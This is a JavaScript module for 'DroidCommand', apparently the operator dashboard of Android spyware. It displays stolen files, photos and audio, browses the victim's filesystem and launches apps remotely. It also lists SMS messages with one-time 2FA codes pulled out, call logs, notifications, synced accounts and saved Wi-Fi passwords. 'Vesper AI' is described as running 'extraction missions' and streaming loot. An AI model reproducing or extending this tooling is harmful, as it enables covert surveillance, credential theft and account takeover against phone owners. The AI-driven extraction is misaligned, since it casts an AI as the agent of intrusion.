// ============================================================
// DroidCommand PWA // Phone Intelligence & Data Deck
// Real-time AI Loot, Filesystem, Installed Apps, Comms Vault
// ============================================================

window.PhoneIntelligence = (function () {
  let activeSubTab = 'loot';
  let currentFilePath = '/sdcard';
  let cachedApps = [];
  let realtimeLootItems = [];

  // Initialize — restore the operator's last deck position across refreshes
  function init() {
    try {
      const savedTab = localStorage.getItem('pi.subtab');
      const savedPath = localStorage.getItem('pi.filepath');
      if (savedTab && ['loot', 'files', 'apps', 'comms'].includes(savedTab)) activeSubTab = savedTab;
      if (savedPath) currentFilePath = savedPath;
    } catch (e) { /* storage unavailable */ }
    switchSubTab(activeSubTab);
  }

  function switchSubTab(tabName) {
    activeSubTab = tabName;
    try { localStorage.setItem('pi.subtab', tabName); } catch (e) {}
    document.querySelectorAll('.phone-subnav-btn').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.tab === tabName);
    });

    const panels = ['loot', 'files', 'apps', 'comms'];
    panels.forEach(p => {
      const el = document.getElementById(`phone-panel-${p}`);
      if (el) el.style.display = (p === tabName) ? 'block' : 'none';
    });

    if (tabName === 'loot') loadLoot();
    if (tabName === 'files') loadFiles(currentFilePath);
    if (tabName === 'apps') loadApps('user');
    if (tabName === 'comms') {
      // fix: restore the last comms vault tab instead of hardcoding 'sms'
      let lastComms = 'sms';
      try { lastComms = localStorage.getItem('pi.commstab') || 'sms'; } catch (e) {}
      switchCommsSubTab(lastComms);
    }
  }

  // ============================================================
  // 1. AI LOOT & EXFILTRATED ARTIFACTS STREAM
  // ============================================================
  async function loadLoot() {
    const list = document.getElementById('phoneLootList');
    if (!list) return;

    try {
      const res = await api('/api/loot/artifacts');
      const badge = document.getElementById('phoneLootBadge');
      if (badge && res.count !== undefined) {
        badge.textContent = res.count;
        badge.style.display = res.count > 0 ? 'inline-flex' : 'none';
      }

      if (res.artifacts && res.artifacts.length > 0) {
        list.innerHTML = '';
        res.artifacts.forEach(item => {
          const card = document.createElement('div');
          card.className = 'loot-artifact-card';

          let iconSvg = '';
          let actionBtn = '';
          const token = window.__DC_TOKEN__ || '';
          const fileUrl = `${item.url}&token=${encodeURIComponent(token)}`;
          const dlUrl = `${item.url}&dl=1&token=${encodeURIComponent(token)}`;

          if (item.type === 'photo' || item.type === 'screenshot') {
            iconSvg = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>`;
            actionBtn = `
              <a href="${fileUrl}" target="_blank" class="action-pill" style="padding: 2px 10px; font-size: 10.5px;">Preview</a>
              <a href="${dlUrl}" class="action-pill" style="padding: 2px 10px; font-size: 10.5px;">Download</a>
            `;
          } else if (item.type === 'audio') {
            iconSvg = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>`;
            actionBtn = `
              <audio controls src="${fileUrl}" style="height: 28px; width: 190px; outline: none;"></audio>
              <a href="${dlUrl}" class="action-pill" style="padding: 2px 10px; font-size: 10.5px;">Download</a>
            `;
          } else {
            iconSvg = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>`;
            actionBtn = `<a href="${dlUrl}" class="action-pill" style="padding: 2px 10px; font-size: 10.5px;">Download</a>`;
          }

          card.innerHTML = `
            <div style="display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0;">
              <div class="loot-icon-badge ${item.type}">${iconSvg}</div>
              <div style="display: flex; flex-direction: column; min-width: 0;">
                <span class="loot-title" title="${escapeHtml(item.filename)}">${escapeHtml(item.filename)}</span>
                <div style="display: flex; gap: 8px; font-family: var(--font-mono); font-size: 10px; color: var(--text-faint);">
                  <span>${item.type.toUpperCase()}</span>
                  <span>·</span>
                  <span>${item.size_human}</span>
                  <span>·</span>
                  <span>${item.source.toUpperCase()}</span>
                </div>
              </div>
            </div>
            <div style="display: flex; align-items: center; gap: 8px; flex-shrink: 0;">
              ${actionBtn}
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = `
          <div style="color: var(--text-graphite); text-align: center; padding: 36px; font-family: var(--font-mono); font-size: 12px;">
            No exfiltrated loot yet. Trigger a sensory snap or let Vesper AI execute an extraction mission.
          </div>
        `;
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Loot registry read error: ${e.message}</div>`;
    }
  }

  // Real-time broadcast connection with Vesper AI
  function addRealtimeLoot(item) {
    realtimeLootItems.unshift(item);
    const badge = document.getElementById('phoneLootBadge');
    if (badge) {
      const cur = parseInt(badge.textContent || '0') + 1;
      badge.textContent = cur;
      badge.style.display = 'inline-flex';
    }
    pushFlow('HIT', `[AI LOOT DISCOVERED] ${item.title || item.filename}`);
    if (activeSubTab === 'loot') {
      loadLoot();
    }
  }

  // ============================================================
  // 2. FILESYSTEM EXPLORER
  // ============================================================
  async function loadFiles(path) {
    currentFilePath = path || '/sdcard';
    try { localStorage.setItem('pi.filepath', currentFilePath); } catch (e) {}
    const list = document.getElementById('phoneFilesList');
    const pathEl = document.getElementById('phoneCurrentPathDisplay');
    if (pathEl) pathEl.textContent = currentFilePath;
    if (!list) return;

    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Reading remote filesystem...</div>';

    try {
      const res = await api('/api/files/list', {
        method: 'POST',
        body: JSON.stringify({ path: currentFilePath, serial: STATE.activeSerial })
      });

      const items = res.items || res.files || [];
      list.innerHTML = '';
      if (currentFilePath !== '/' && currentFilePath !== '') {
        const upRow = document.createElement('div');
        upRow.className = 'target-card';
        upRow.style.cursor = 'pointer';
        upRow.innerHTML = `
          <div style="display: flex; align-items: center; gap: 8px;">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
            <strong style="font-family: var(--font-mono); font-size: 12px;">.. [Parent Directory]</strong>
          </div>
        `;
        upRow.onclick = () => {
          const parent = currentFilePath.split('/').slice(0, -1).join('/') || '/';
          loadFiles(parent);
        };
        list.appendChild(upRow);
      }

      if (items.length === 0) {
        const emptyRow = document.createElement('div');
        emptyRow.style.color = 'var(--text-graphite)';
        emptyRow.style.padding = '24px';
        emptyRow.style.textAlign = 'center';
        emptyRow.style.fontFamily = 'var(--font-mono)';
        emptyRow.textContent = 'Empty directory.';
        list.appendChild(emptyRow);
      } else {
        items.forEach(f => {
          const row = document.createElement('div');
          row.className = 'target-card';
          const isDir = f.is_dir;
          const token = window.__DC_TOKEN__ || '';
          const dlUrl = `/api/files/download?path=${encodeURIComponent(currentFilePath + '/' + f.name)}&token=${encodeURIComponent(token)}`;

          const folderSvg = `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--ember)" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>`;
          const fileSvg = `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>`;

          row.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px; cursor: ${isDir ? 'pointer' : 'default'}; flex: 1; min-width: 0;">
              <span>${isDir ? folderSvg : fileSvg}</span>
              <strong style="font-family: var(--font-mono); font-size: 12px; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">${escapeHtml(f.name)}</strong>
              ${!isDir ? `<span style="font-size: 10.5px; color: var(--text-faint);">(${f.size_formatted || f.size || '0 B'})</span>` : ''}
            </div>
            ${!isDir ? `
              <a href="${dlUrl}" class="action-pill" style="padding: 2px 10px; font-size: 10.5px;">Download</a>
            ` : ''}
          `;

          if (isDir) {
            row.onclick = () => loadFiles(`${currentFilePath === '/' ? '' : currentFilePath}/${f.name}`);
          }
          list.appendChild(row);
        });
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Directory read error: ${e.message}</div>`;
    }
  }

  // ============================================================
  // 3. APPLICATIONS VAULT
  // ============================================================
  async function loadApps(filterType, searchQuery) {
    const list = document.getElementById('phoneAppsList');
    if (!list) return;

    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Querying installed package registry...</div>';

    try {
      const q = filterType ? `?type=${encodeURIComponent(filterType)}` : '?type=user';
      const res = await api(`/api/apps/list${q}`);
      cachedApps = res.apps || [];
      renderApps(cachedApps, searchQuery);
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Apps query failed: ${e.message}</div>`;
    }
  }

  function renderApps(apps, searchQuery) {
    const list = document.getElementById('phoneAppsList');
    if (!list) return;

    let filtered = apps;
    if (searchQuery) {
      const sq = searchQuery.toLowerCase();
      filtered = apps.filter(a => a.package.toLowerCase().includes(sq) || (a.name && a.name.toLowerCase().includes(sq)));
    }

    if (filtered.length === 0) {
      list.innerHTML = `<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No applications matched.</div>`;
      return;
    }

    list.innerHTML = '';
    filtered.forEach(app => {
      const card = document.createElement('div');
      card.className = 'target-card';
      card.innerHTML = `
        <div style="display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0;">
          <div style="width: 32px; height: 32px; border-radius: 8px; background: var(--surface-well); border: 1px solid var(--hairline); display: grid; place-items: center; font-family: var(--font-mono); font-size: 11px; font-weight: 700; color: var(--ember);">
            ${escapeHtml((app.name || 'A').slice(0, 2).toUpperCase())}
          </div>
          <div style="display: flex; flex-direction: column; min-width: 0;">
            <div style="display: flex; align-items: center; gap: 8px;">
              <strong style="font-size: 13px; color: var(--text-ink);">${escapeHtml(app.name || app.package)}</strong>
              <span class="stat-badge" style="font-size: 9px; padding: 1px 6px;">${app.is_system ? 'SYSTEM' : 'USER'}</span>
            </div>
            <span style="font-family: var(--font-mono); font-size: 10.5px; color: var(--text-faint); text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">
              ${escapeHtml(app.package)}
            </span>
          </div>
        </div>
        <div style="display: flex; gap: 6px; flex-shrink: 0;">
          <button class="action-pill" style="padding: 2px 10px; font-size: 10.5px;" onclick="PhoneIntelligence.launchApp('${escapeHtml(app.package)}')">
            Launch
          </button>
        </div>
      `;
      list.appendChild(card);
    });
  }

  async function launchApp(pkg) {
    try {
      pushFlow('CMD', `Launching ${pkg} on target...`);
      const res = await api('/api/apps/launch', {
        method: 'POST',
        body: JSON.stringify({ package: pkg, serial: STATE.activeSerial })
      });
      if (res.success) {
        pushFlow('HIT', `Application ${pkg} launched.`);
        if (window.Glass) setTimeout(window.Glass.fetchFrame, 600);
      } else {
        pushFlow('ALERT', `Launch error: ${res.error}`);
      }
    } catch (e) {
      pushFlow('ALERT', `Launch exception: ${e.message}`);
    }
  }

  // ============================================================
  // 4. COMMUNICATIONS & EXFILTRATED DATA VAULT
  // ============================================================
  let activeCommsTab = 'sms';
  function switchCommsSubTab(subtab) {
    activeCommsTab = subtab;
    try { localStorage.setItem('pi.commstab', subtab); } catch (e) {}
    document.querySelectorAll('.phone-comms-btn').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.comms === subtab);
    });

    const cpanels = ['sms', 'calls', 'notifications', 'accounts', 'wifi'];
    cpanels.forEach(cp => {
      const el = document.getElementById(`phone-comms-${cp}`);
      if (el) el.style.display = (cp === subtab) ? 'block' : 'none';
    });

    if (subtab === 'sms') loadSms();
    if (subtab === 'calls') loadCalls();
    if (subtab === 'notifications') loadNotifications();
    if (subtab === 'accounts') loadAccounts();
    if (subtab === 'wifi') loadWifi();
  }

  async function loadSms() {
    const list = document.getElementById('phoneSmsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Extracting SMS threads and 2FA tokens...</div>';

    try {
      const res = await api(`/api/comms/sms?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.messages && res.messages.length > 0) {
        list.innerHTML = '';
        res.messages.forEach(m => {
          const card = document.createElement('div');
          card.className = 'target-card';
          // Check for 2FA OTP tokens
          const otpMatch = (m.body || '').match(/\b\d{4,8}\b/);
          card.innerHTML = `
            <div style="display: flex; flex-direction: column; gap: 4px; width: 100%;">
              <div style="display: flex; align-items: center; justify-content: space-between;">
                <strong style="font-size: 12.5px; color: var(--text-ink); font-family: var(--font-mono);">${escapeHtml(m.address || 'Unknown Sender')}</strong>
                <div style="display: flex; align-items: center; gap: 6px;">
                  ${otpMatch ? `<span class="stat-badge" style="background: var(--ember-soft); color: var(--ember); font-weight: 700;">OTP: ${otpMatch[0]}</span>` : ''}
                  <span style="font-size: 10px; color: var(--text-faint); font-family: var(--font-mono);">${escapeHtml(m.date || '')}</span>
                </div>
              </div>
              <div style="font-size: 12px; color: var(--text-graphite); line-height: 1.5; white-space: pre-wrap;">${escapeHtml(m.body || '')}</div>
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No SMS messages extracted.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">SMS extract failed: ${e.message}</div>`;
    }
  }

  async function loadCalls() {
    const list = document.getElementById('phoneCallsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Extracting call records...</div>';

    try {
      const res = await api(`/api/comms/calls?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.calls && res.calls.length > 0) {
        list.innerHTML = '';
        res.calls.forEach(c => {
          const card = document.createElement('div');
          card.className = 'target-card';
          card.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
              <div>
                <strong style="font-family: var(--font-mono); font-size: 12.5px;">${escapeHtml(c.number || 'Unknown')}</strong>
                <div style="font-size: 11px; color: var(--text-faint);">${escapeHtml(c.name || 'Unsaved Contact')} · ${c.duration || 0}s</div>
              </div>
              <div style="text-align: right; font-family: var(--font-mono); font-size: 10.5px;">
                <span class="stat-badge">${escapeHtml((c.type || 'CALL').toUpperCase())}</span>
                <div style="color: var(--text-faint); margin-top: 2px;">${escapeHtml(c.date || '')}</div>
              </div>
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No call logs found.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Calls extract failed: ${e.message}</div>`;
    }
  }

  async function loadNotifications() {
    const list = document.getElementById('phoneNotificationsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Extracting active notifications...</div>';

    try {
      const res = await api(`/api/exploit/notifications?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.notifications && res.notifications.length > 0) {
        list.innerHTML = '';
        res.notifications.forEach(n => {
          const card = document.createElement('div');
          card.className = 'target-card';
          card.innerHTML = `
            <div style="display: flex; flex-direction: column; gap: 3px; width: 100%;">
              <div style="display: flex; align-items: center; justify-content: space-between;">
                <strong style="font-size: 12px; color: var(--text-ink);">${escapeHtml(n.title || n.package || 'Notification')}</strong>
                <span style="font-family: var(--font-mono); font-size: 9.5px; color: var(--text-faint);">${escapeHtml(n.package || '')}</span>
              </div>
              <div style="font-size: 11.5px; color: var(--text-graphite);">${escapeHtml(n.text || '')}</div>
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No live notifications posted.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Notifications extract failed: ${e.message}</div>`;
    }
  }

  async function loadAccounts() {
    const list = document.getElementById('phoneAccountsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Dumping synchronized accounts...</div>';

    try {
      const res = await api(`/api/skeleton/creds/accounts?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.accounts && res.accounts.length > 0) {
        list.innerHTML = '';
        res.accounts.forEach(acc => {
          const card = document.createElement('div');
          card.className = 'target-card';
          card.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
              <div>
                <strong style="font-size: 12.5px; color: var(--text-ink); font-family: var(--font-mono);">${escapeHtml(acc.name || acc.account)}</strong>
                <div style="font-size: 11px; color: var(--text-faint);">${escapeHtml(acc.type || 'Account')}</div>
              </div>
              <span class="stat-badge" style="color: var(--emerald);">SYNCED</span>
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No accounts revealed.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Accounts dump failed: ${e.message}</div>`;
    }
  }

  async function loadWifi() {
    const list = document.getElementById('phoneWifiList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 20px; font-family: var(--font-mono);">Dumping saved Wi-Fi credentials...</div>';

    try {
      const res = await api(`/api/toolkit/wifi-passwords?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.passwords && res.passwords.length > 0) {
        list.innerHTML = '';
        res.passwords.forEach(w => {
          const card = document.createElement('div');
          card.className = 'target-card';
          card.innerHTML = `
            <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
              <div>
                <strong style="font-size: 13px; color: var(--text-ink); font-family: var(--font-mono);">${escapeHtml(w.ssid || 'Network')}</strong>
                <div style="font-size: 11px; color: var(--ember); font-family: var(--font-mono); font-weight: 600;">PSK: ${escapeHtml(w.psk || w.password || 'Open')}</div>
              </div>
              <span class="stat-badge" style="color: var(--text-ink);">${escapeHtml(w.key_mgmt || 'WPA2-PSK')}</span>
            </div>
          `;
          list.appendChild(card);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 24px; text-align: center;">No saved Wi-Fi networks found.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 20px;">Wi-Fi dump failed: ${e.message}</div>`;
    }
  }

  return {
    init,
    switchSubTab,
    loadLoot,
    addRealtimeLoot,
    loadFiles,
    loadApps,
    renderApps,
    launchApp,
    switchCommsSubTab,
    loadSms,
    loadCalls,
    loadNotifications,
    loadAccounts,
    loadWifi
  };
})();
